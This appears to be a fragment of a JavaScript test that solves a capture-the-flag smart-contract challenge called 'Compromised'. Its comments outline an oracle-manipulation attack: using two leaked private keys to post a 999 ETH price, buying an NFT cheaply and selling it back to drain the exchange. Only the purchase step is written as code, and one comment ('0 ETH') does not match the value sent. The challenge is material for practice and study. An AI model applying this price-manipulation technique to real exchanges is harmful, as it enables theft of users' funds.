...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    // Initialize wallets with the 2 leaked private keys
    ...
    // Buy one NFT for 0 ETH and get the id
    const tx = await exchange.connect(player).buyOne({ value: 10n ** 16n });
    const txResponse = await tx.wait();
    const id = txResponse.events[1].args.tokenId;

    // Post price for 999 ETH
    ...
    // Sell the NFT for 999 ETH and drain the exchange balance
